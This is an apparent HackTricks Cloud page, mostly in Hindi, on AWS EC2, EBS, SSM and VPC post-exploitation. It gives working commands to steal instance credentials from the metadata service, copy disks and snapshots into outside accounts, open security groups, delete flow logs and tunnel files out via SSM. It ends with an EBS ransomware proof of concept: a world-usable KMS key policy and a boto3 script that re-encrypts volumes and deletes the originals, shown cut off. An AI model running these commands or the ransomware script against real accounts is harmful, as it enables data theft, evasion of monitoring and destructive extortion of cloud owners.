# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

For more information check:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **VPC के अंदर EC2 instances के लिए इनबाउंड और आउटबाउंड ट्रैफ़िक को डुप्लिकेट करता है** और इसमें instances पर कुछ भी इंस्टॉल करने की ज़रूरत नहीं होती। यह डुप्लिकेट किया गया ट्रैफ़िक आमतौर पर विश्लेषण और मॉनिटरिंग के लिए किसी network intrusion detection system (IDS) जैसी चीज़ को भेजा जाता है.\
एक attacker इसका दुरुपयोग करके सभी ट्रैफ़िक को कैप्चर कर सकता है और उससे संवेदनशील जानकारी प्राप्त कर सकता है:

For more information check this page:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances में आमतौर पर किसी न किसी तरह की संवेदनशील जानकारी होती है। अंदर पहुँचने के अलग-अलग तरीके होते हैं (देखें [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). हालांकि, इसकी सामग्री देखने का एक और तरीका है कि आप **create an AMI and run a new instance (even in your own account) from it**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, जो आमतौर पर **संवेदनशील जानकारी** रखते हैं, इसलिए उन्हें चेक करने पर यह जानकारी उजागर हो सकती है।\
If you find a **volume without a snapshot** you could: **Create a snapshot** and perform the following actions or just **mount it in an instance** inside the account:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

EC2 AMI को सीधे S3 में export करने के लिए `CreateStoreImageTask` का उपयोग करके बिना snapshot sharing के raw disk image प्राप्त करें। इससे instance की networking को अप्रभावित रखते हुए पूरा offline forensics या data theft संभव होता है।

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

io1/io2 Multi-Attach volume को दूसरी instance से attach करके उसे read-only mount करें और snapshots के बिना live data siphon करें। जब victim volume पहले से ही उसी AZ में Multi-Attach enabled हो तो यह उपयोगी होता है।

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

EC2 Instance Connect Endpoint बनाएं, ingress authorize करें, और ephemeral SSH keys inject करके managed tunnel के माध्यम से private instances तक पहुंच प्राप्त करें। यह public ports खोले बिना तेज़ lateral movement के रास्ते देता है।

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

victim ENI का secondary private IP attacker-controlled ENI में move करके IP द्वारा allowlisted trusted hosts का impersonation करें। यह internal ACLs या specific addresses पर keyed SG rules को bypass करने में सक्षम बनाता है।

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

victim instance से Elastic IP को attacker के साथ reassociate करके inbound ट्रैफ़िक intercept करें या ऐसे outbound कनेक्शन originate करें जो trusted public IPs से आते दिखें।

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

यदि कोई security group rule किसी customer-managed prefix list को reference करता है, तो उस list में attacker CIDRs जोड़ने से बिना SG को बदले हर dependent SG rule में चुपचाप पहुंच बढ़ जाती है।

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

gateway या interface VPC endpoints बनाकर isolated subnets से outbound access फिर से प्राप्त करें। AWS-managed private links का उपयोग करके missing IGW/NAT controls को bypass करके डेटा exfiltration की जा सकती है।

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

ec2:AuthorizeSecurityGroupIngress permission वाले attacker security groups में inbound rules जोड़ सकते हैं (उदाहरण के लिए, 0.0.0.0/0 से tcp:80 की अनुमति), जिससे internal services public Internet या अन्य unauthorized networks के लिए उजागर हो जाती हैं।
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
एक attacker जिसके पास ec2:ReplaceNetworkAclEntry (या समान) permissions हों, वे एक subnet के Network ACLs (NACLs) को बहुत permissive बना सकते हैं — उदाहरण के लिए critical ports पर 0.0.0.0/0 allow करके — जिससे पूरा subnet range Internet या unauthorized network segments के लिए खुल सकता है। Security Groups के विपरीत, जिन्हें per-instance लागू किया जाता है, NACLs subnet स्तर पर लागू होते हैं, इसलिए किसी restrictive NACL को बदलने से बहुत अधिक hosts तक access सक्षम होकर blast radius काफी बड़ा हो सकता है।
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

ec2:Delete* और iam:Remove* permissions वाले attacker महत्वपूर्ण infrastructure resources और configurations को हटा सकते हैं — जैसे key pairs, launch templates/versions, AMIs/snapshots, volumes या attachments, security groups या rules, ENIs/network endpoints, route tables, gateways, या managed endpoints. इससे तात्कालिक service disruption, डेटा लॉस, और forensic evidence का नाश हो सकता है।

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

VPC Flow Logs को attacker-controlled S3 bucket की ओर पॉइंट करें ताकि नेटवर्क metadata (source/destination, ports) लगातार victim account के बाहर long-term reconnaissance के लिए इकट्ठा किया जा सके।

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

अगर आप EC2 को लॉक डाउन कर दें ताकि कोई traffic बाहर न जाए, तब भी यह **exfil via DNS** कर सकता है।

- **VPC Flow Logs will not record this**।
- आपके पास AWS DNS logs तक पहुँच नहीं है।
- इसे disable करने के लिए "enableDnsSupport" को false सेट करें:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

एक attacker उस account के API endpoints को कॉल कर सकता है जिसे वह नियंत्रित करता है। Cloudtrail इन calls को log करेगा और attacker Cloudtrail logs में exfiltrate डेटा देख सकेगा।

### Open Security Group

आप इस तरह पोर्ट खोलकर network services तक और पहुँच प्राप्त कर सकते हैं:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

EC2 instance को चलाकर और उसे ECS instances चलाने के लिए register करके आप उस ECS instances का डेटा चुरा सकते हैं।

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

EC2 container instance पर चल रहे किसी भी ECS task के अंदर का compromise आमतौर पर host रोल और उस node पर मौजूद अन्य सभी tasks से जुड़े IAM roles तक pivot करने के लिए पर्याप्त होता है। क्योंकि ECS-on-EC2 के लिए **कोई task isolation नहीं है**, हर task डिफ़ॉल्ट रूप से EC2 Instance Metadata Service (IMDS) को query कर सकता है, container instance profile चुरा सकता है, और फिर वही WebSocket protocol बोल सकता है जिसे ECS agent control plane के साथ उपयोग करता है (यहाँ **ECScape** primitive) ताकि उस host पर वर्तमान में scheduled सभी tasks के credentials प्राप्त किए जा सकें। Latacora ने अपने [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/) में इस workflow का documentation किया है, जिसे नीचे का offensive सार संक्षेप में पेश करता है।

#### Attack chain

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** उन credentials के साथ आप undocumented WebSocket चैनल बोल सकते हैं जिसे ECS agent उपयोग करता है; control plane आपको वास्तविक agent समझकर every task IAM credentials आपके process को दे देता है। अब आप higher-privileged tasks lokaal चला सकते हैं, task environment secrets dump कर सकते हैं, या services/tasks को update करके ऐसे workloads redeploy कर सकते हैं जिन्हें आप पूरी तरह निरीक्षण कर सकें।

#### IMDS reachability with IMDSv2 + hop limit 1

IMDSv2 को `HttpTokens=required` और `HttpPutResponseHopLimit=1` के साथ सेट करना केवल उन tasks को ब्लॉक करता है जो एक अतिरिक्त hop (Docker bridge) के पीछे रहते हैं। अन्य networking modes Nitro controller के एक hop के भीतर रहते हैं और फिर भी responses प्राप्त होते हैं:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Each task gets its own ENI that is still one hop away from IMDS, so tokens and metadata responses arrive successfully. |
| `host` | ✅ | Tasks share the host namespace, so they see the same hop distance as the EC2 instance. |
| `bridge` | ❌ | Responses die on the Docker bridge because that extra hop exhausts the hop limit. |

इसलिए, **कभी भी यह मत मानें कि hop limit 1 awsvpc या host-mode workloads को सुरक्षित करता है**—हमेशा अपने containers के अंदर से टेस्ट करें।

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, या routing tweaks link-local 169.254.169.254 address को ब्लॉक नहीं कर सकते क्योंकि Nitro इसे on-host inject करता है। `/etc/ecs/ecs.config` में `ECS_AWSVPC_BLOCK_IMDS=true` के लिए चेक करें। अगर यह flag missing है (default) तो आप task से सीधे IMDS को curl कर सकते हैं। अगर यह सेट है, तो host/agent namespace में pivot करके इसे वापस flip करें या अपना tooling awsvpc के बाहर execute करें।

- **bridge mode:** जब metadata requests fail करती हैं भले ही hop limit 1 configurated हो, तो defenders ने शायद `DOCKER-USER` drop rule डाल दिया होगा जैसे `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`। `iptables -S DOCKER-USER` लिस्ट करने से यह पता चलता है, और root access से आप query करने से पहले rule को delete या reorder कर सकते हैं।

- **host mode:** agent configuration में `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false` की जाँच करें। यह setting task IAM roles को पूरी तरह हटा देती है, इसलिए आपको या तो इसे फिर से enable करना होगा, awsvpc tasks में move करना होगा, या host पर किसी दूसरे process के माध्यम से credentials चुराने होंगे। जब value `true` (default) होती है, तो हर host-mode process—जिसमें compromised containers भी शामिल हैं—IMDS तक पहुँच सकते हैं जब तक कि bespoke eBPF/cgroup filters सीधे `169.254.169.254` को target न कर रहे हों; tc/eBPF programs या iptables rules में उस address का संदर्भ खोजें।

Latacora ने [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) भी रिलीज़ किया है जिसे आप target account में drop करके यह सूची बना सकते हैं कि कौन से network modes अब भी metadata expose करते हैं और अपने अगले कदम की योजना बना सकते हैं।

एक बार जब आप समझ लें कि कौन से modes IMDS expose करते हैं तो आप अपना post-exploitation path plan कर सकते हैं: किसी भी ECS task को target करें, instance profile request करें, agent का impersonate करें, और lateral movement या cluster के अंदर persistence के लिए हर दूसरे task role को harvest करें।

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

आवश्यक अनुमतियाँ:

- `ssm:StartSession`

कमांड निष्पादन के अलावा, SSM ट्रैफ़िक टनलिंग की अनुमति देता है जिसे Security Groups या NACLs के कारण नेटवर्क एक्सेस न रखने वाले EC2 इंस्टेंस से pivoting के लिए दुरुपयोग किया जा सकता है।
एक उपयोगी परिदृश्यों में से एक है [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) से एक निजी EKS cluster की ओर pivoting करना।

> सत्र शुरू करने के लिए आपके पास SessionManagerPlugin इंस्टॉल होना चाहिए: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. अपने मशीन पर SessionManagerPlugin इंस्टॉल करें
2. निम्नलिखित कमांड का उपयोग करके Bastion EC2 में लॉग इन करें:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 के AWS temporary credentials को [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script के साथ प्राप्त करें  
4. credentials को अपनी मशीन के `$HOME/.aws/credentials` फ़ाइल में `[bastion-ec2]` profile के रूप में ट्रांसफर करें  
5. Bastion EC2 के रूप में EKS में लॉग इन करें:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` फ़ाइल में `server` फ़ील्ड को `https://localhost` की ओर इंगित करने के लिए अपडेट करें।
7. निम्नानुसार एक SSM tunnel बनाएं:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` टूल से आने वाला ट्रैफ़िक अब SSM टनल के माध्यम से Bastion EC2 के जरिए फ़ॉरवर्ड किया जाता है और आप अपनी मशीन से निम्न कमांड चलाकर निजी EKS क्लस्टर तक पहुंच सकते हैं:
```shell
kubectl get pods --insecure-skip-tls-verify
```
ध्यान दें कि SSL कनेक्शन्स तब तक फेल हो जाएँगी जब तक आप `--insecure-skip-tls-verify` फ्लैग (या K8s audit tools में इसका समतुल्य) सेट नहीं करते। चूँकि ट्रैफ़िक secure AWS SSM tunnel के माध्यम से टनल किया जाता है, आप किसी भी प्रकार के MitM attacks से सुरक्षित हैं।

आख़िरकार, यह technique सिर्फ private EKS clusters पर हमला करने के लिए specific नहीं है। आप किसी भी अन्य AWS service या किसी custom application पर pivot करने के लिए arbitrary domains और ports सेट कर सकते हैं।

---

#### त्वरित लोकल ↔️ रिमोट पोर्ट फ़ॉरवर्ड (AWS-StartPortForwardingSession)

यदि आपको केवल **EC2 instance से अपने local host पर एक TCP पोर्ट फॉरवर्ड** करने की आवश्यकता है, तो आप `AWS-StartPortForwardingSession` SSM document का उपयोग कर सकते हैं (कोई remote host parameter आवश्यक नहीं है):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
यह कमांड आपके workstation (`localPortNumber`) और instance पर चयनित पोर्ट (`portNumber`) के बीच एक द्वि-दिशीय टनल स्थापित करता है **बिना किसी इनबाउंड Security-Group rules को खोले**।

Common use cases:

* **File exfiltration**
1. instance पर उस डायरेक्टरी की ओर इशारा करते हुए एक त्वरित HTTP server शुरू करें जिसे आप exfiltrate करना चाहते हैं:

```bash
python3 -m http.server 8000
```

2. अपने workstation से SSM tunnel के माध्यम से फाइलें प्राप्त करें:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Internal web applications तक पहुँच (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
टिप: एक्सफिल्ट्रेट करने से पहले सबूत को संपीड़ित और एन्क्रिप्ट करें ताकि CloudTrail स्पष्ट-पाठ सामग्री को लॉग न करे:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMI साझा करें
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### सार्वजनिक और निजी AMIs में संवेदनशील जानकारी खोजें

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel एक उपकरण है जिसे **सार्वजनिक या निजी Amazon Machine Images (AMIs) के भीतर संवेदनशील जानकारी खोजने के लिए** डिज़ाइन किया गया है। यह target AMIs से instances लॉन्च करने, उनके volumes माउंट करने, और संभावित secrets या संवेदनशील डेटा को स्कैन करने की प्रक्रिया को स्वचालित करता है।

### EBS Snapshot साझा करें
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation नोट्स में दिखाए गए Ransomware demonstration के समान एक proof of concept। KMS को RMS कहना चाहिए — Ransomware Management Service — क्योंकि इसका उपयोग विभिन्न AWS सेवाओं को एन्क्रिप्ट करने के लिए करना कितना आसान है।

पहले एक 'attacker' AWS खाते से, KMS में एक customer managed key बनाएं। इस उदाहरण में हम AWS को ही key data प्रबंधित करने देंगे, लेकिन वास्तविक परिदृश्य में कोई malicious actor कुंजी डेटा को AWS के नियंत्रण के बाहर रखेगा। Key policy बदलकर किसी भी AWS account Principal को key का उपयोग करने की अनुमति दें। इस key policy के लिए, खाते का नाम 'AttackSim' था और सभी access की अनुमति देने वाला policy rule 'Outside Encryption' कहा जाता है।
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
कुंजी नीति के नियम में निम्नलिखित सक्षम होना चाहिए ताकि इसे EBS volume को एन्क्रिप्ट करने के लिए उपयोग किया जा सके:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

अब सार्वजनिक रूप से उपलब्ध key के साथ उपयोग करने के लिए। हम एक 'victim' account का उपयोग कर सकते हैं जिसमें कुछ EC2 instances चलाए गए हैं जिनके साथ unencrypted EBS volumes जुड़े हुए हैं। इस 'victim' account के EBS volumes ही हमारा लक्ष्य हैं जिन्हें एन्क्रिप्ट किया जाएगा — यह हमला एक उच्च-privilege AWS account के संभावित breach के अंतर्गत है।

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 ransomware उदाहरण के समान। यह हमला संलग्न EBS volumes की snapshots लेकर उनकी प्रतियाँ बनायेगा, 'attacker' account से सार्वजनिक रूप से उपलब्ध key का उपयोग करके नई EBS volumes को एन्क्रिप्ट करेगा, फिर मूल EBS volumes को EC2 instances से detach करके उन्हें delete करेगा, और अंत में उन snapshots को भी delete कर देगा जिनका उपयोग नई एन्क्रिप्टेड EBS volumes बनाने के लिए किया गया था। ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

इसका परिणाम यह होगा कि खाते में केवल एन्क्रिप्टेड EBS volumes ही उपलब्ध रहेंगे।

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

यह भी ध्यान देने योग्य है कि स्क्रिप्ट ने मूल EBS volumes को detach और delete करने के लिए EC2 instances को stop किया। मूल unencrypted volumes अब मौजूद नहीं हैं।

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

अगला कदम: 'attacker' account में key policy पर वापस जाएं और key policy से 'Outside Encryption' policy rule हटा दें।
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Wait a moment for the newly set key policy to propagate. Then return to the 'victim' account and attempt to attach one of the newly encrypted EBS volumes. You'll find that you can attach the volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

But when you attempt to actually start the EC2 instance back up with the encrypted EBS volume it'll just fail and go from the 'pending' state back to the 'stopped' state forever since the attached EBS volume can't be decrypted using the key since the key policy no longer allows it.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

यह वही python script है जो इस्तेमाल किया गया। यह 'victim' account के लिए AWS creds और encryption के लिए उपयोग किए जाने वाले key के लिए एक publicly available AWS ARN मान लेता है। Script लक्ष्यित AWS account में लगे सभी EC2 instances से जुड़े सभी उपलब्ध EBS volumes की encrypted प्रतियाँ बनाएगा, फिर हर EC2 instance को stop करेगा, original EBS volumes को detach करेगा, उन्हें delete करेगा, और अंत में प्रक्रिया के दौरान उपयोग किए गए सभी snapshots को delete करेगा। इससे लक्ष्यित 'victim' account में केवल encrypted EBS volumes ही बचेंगे। ONLY USE THIS SCRIPT IN A TEST ENVIRONMENT, IT IS DESTRUCTIVE AND WILL DELETE ALL THE ORIGINAL EBS VOLUMES. आप उन्हें उपयोग किए गए KMS key का उपयोग करके recover कर सकते हैं और snapshots के माध्यम से उन्हें उनकी मूल स्थिति में restore कर सकते हैं, पर मैं बस यह बताना चाहता हूँ कि अंततः यह एक ransomware PoC है।
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

